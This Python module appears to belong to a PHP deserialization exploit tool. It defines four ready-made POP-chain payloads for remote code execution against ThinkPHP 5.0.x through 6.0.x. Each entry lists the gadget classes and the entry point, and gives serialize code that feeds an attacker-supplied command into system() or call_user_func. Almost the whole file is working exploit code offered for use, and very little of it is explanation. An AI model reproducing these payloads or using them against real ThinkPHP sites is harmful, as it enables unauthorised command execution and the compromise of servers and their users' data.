"""ThinkPHP POP chains (5.0.x - 6.0.x).

Helper functions available in eval context:
  _s(val)              -> s:<len>:"<val>";
  _i(val)              -> i:<val>;
  _b(val)              -> b:1; / b:0;
  _N()                 -> N;
  _O(cls, n, props)    -> O:<len>:"<cls>":<n>:{<props>}
  _a(count, flat)      -> a:<count>:{<flat>}
  _e(key, val)         -> key + val (explicit array entry)
  _protected(name)     -> \\x00*\\x00<name>
  _private(cls, name)  -> \\x00<cls>\\x00<name>
"""
from . import POPChain

THINKPHP_CHAINS: list = [
    # ==================================================================
    # tp5_rce_windows — ThinkPHP 5.0.x
    # Windows::__destruct -> Output -> call_user_func('system', cmd)
    # Output has 1 property: protected styles (an array)
    # ==================================================================
    POPChain(
        name="tp5_rce_windows",
        framework="ThinkPHP",
        gadget_classes=["think\\process\\pipes\\Windows", "think\\console\\Output"],
        entry_point="__destruct",
        sink="system(cmd)",
        command_param="cmd",
        serialize_code=(
            '_O(b"think\\\\console\\\\Output", 1,'
            '_s(_protected("styles")) + _a(1,'
            '_e(_s(b"block"), '
            '_a(2,'
            '_e(_s(b"fake"), _s(__command__)) + '
            '_e(_s(b"system"), _s(b"system"))'
            ')'  # close _a(2,...)
            ')'  # close _e
            ')'  # close _a(1,...)
            ')'  # close _O
        ),
        notes="ThinkPHP 5.0.x. Windows::__destruct -> Output::__call -> system(cmd).",
    ),

    # ==================================================================
    # tp5_rce_output — ThinkPHP 5.1.x
    # Request: 3 properties (filter, input, hook)
    # Pivot: 1 property (append)
    # ==================================================================
    POPChain(
        name="tp5_rce_output",
        framework="ThinkPHP",
        gadget_classes=["think\\model\\concern\\Conversion", "think\\model\\Pivot", "think\\Request"],
        entry_point="__destruct",
        sink="call_user_func(callback)",
        command_param="callback",
        serialize_code=(
            '_O(b"think\\\\Request", 3,'
            '_s(_protected("filter")) + _s(b"system") + '
            '_s(_protected("input")) + _s(__command__) + '
            '_s(_protected("hook")) + _N()'
            ')'
            '+ _O(b"think\\\\model\\\\Pivot", 1,'
            '_s(_protected("append")) + _a(1, _e(_s(b"a"), _s(b"b")))'
            ')'
        ),
        notes="ThinkPHP 5.1.x. Conversion::__toString -> Request::__call -> call_user_func_array('system', cmd).",
    ),

    # ==================================================================
    # tp6_rce — ThinkPHP 6.0.x
    # Model: 5 properties (lazySave, exists, data, withAttr, force)
    # ==================================================================
    POPChain(
        name="tp6_rce",
        framework="ThinkPHP",
        gadget_classes=["think\\Model", "think\\model\\concern\\Attribute"],
        entry_point="__destruct",
        sink="system(...)",
        command_param="data",
        serialize_code=(
            '_O(b"think\\\\Model", 5,'
            '_s(_protected("lazySave")) + _b(True) + '
            '_s(_protected("exists")) + _b(True) + '
            '_s(_protected("data")) + _a(1, _e(_s(__command__), _s(__command__))) + '
            '_s(_protected("withAttr")) + _a(1, _e(_s(__command__), _s(b"system"))) + '
            '_s(_protected("force")) + _b(True)'
            ')'
        ),
        notes="ThinkPHP 6.0.x. Model::__destruct -> save() -> trigger withAttr -> system(cmd).",
    ),

    # ==================================================================
    # tp5_request_rce — ThinkPHP 5.x minimal Request chain
    # Request: 5 properties (filter, input, hook, path, domain)
    # ==================================================================
    POPChain(
        name="tp5_request_rce",
        framework="ThinkPHP",
        gadget_classes=["think\\Request"],
        entry_point="__call",
        sink="call_user_func(callback)",
        command_param="callback",
        serialize_code=(
            '_O(b"think\\\\Request", 5,'
            '_s(_protected("filter")) + _s(b"system") + '
            '_s(_protected("input")) + _s(__command__) + '
            '_s(_protected("hook")) + _N() + '
            '_s(_protected("path")) + _N() + '
            '_s(_protected("domain")) + _s(b"system")'
            ')'
        ),
        notes="ThinkPHP 5.x Request POP chain. __call -> call_user_func_array('system', [cmd]).",
    ),
]
